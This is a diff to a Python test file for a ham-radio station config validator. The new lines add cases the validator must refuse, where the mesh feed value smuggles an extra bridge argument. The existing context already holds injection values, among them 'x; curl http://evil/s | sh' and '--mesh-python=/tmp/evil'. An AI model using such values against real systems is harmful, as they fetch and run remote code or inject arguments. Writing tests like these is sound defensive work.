@@ -86,6 +86,10 @@ refused("audio_in with a quote (inside sh -c '...')", station_h,
 refused("device as an option", station_h, lambda h: h["radios"][0].update(device="--help"))
 refused("mesh port as an option", station_h, setp(("mesh", "port"), "--mesh-python=/tmp/evil"))
 refused("mesh python with a space", station_h, setp(("mesh", "python"), "/usr/bin/python3 -c x"))
+refused("mesh feed with a space (an extra bridge argument)", station_h,
+        setp(("mesh", "feed"), "mqtt://h/p --feed-tx"))
+refused("mesh feed as an option", station_h, setp(("mesh", "feed"), "--feed-tx"))
+refused("mesh feed_tx as a string", station_h, setp(("mesh", "feed_tx"), "yes"))
 refused("radio id with a slash (a unit name)", station_h, lambda h: h["radios"][0].update(id="../g90"))
 refused("ardopcf label with ';' (pasted into a shell)", mac,
         setp(("winlink", "ardopcf", "label"), "x; curl http://evil/s | sh"))
@@ -106,6 +110,7 @@ for name, h, m in (
          setp(("winlink", "ardopcf", "audio_in"), "USB Audio CODEC")),
         ("callsign with SSID", station_h, setp(("packet", "mycall"), "N9ABC-10")),
         ("mesh port list of serial and ble", station_h, setp(("mesh", "port"), "/dev/meshtastic,ble:NODEA_fd78")),
+        ("mesh feed URL with a port and path", station_h, setp(("mesh", "feed"), "mqtt://192.168.1.5:1883/meshfeed/a-1")),
         ("codec table", station_h, lambda h: h["radios"][0].update(codec_db="default=-32,40m=-32"))):
     h = copy.deepcopy(h)
     m(h)
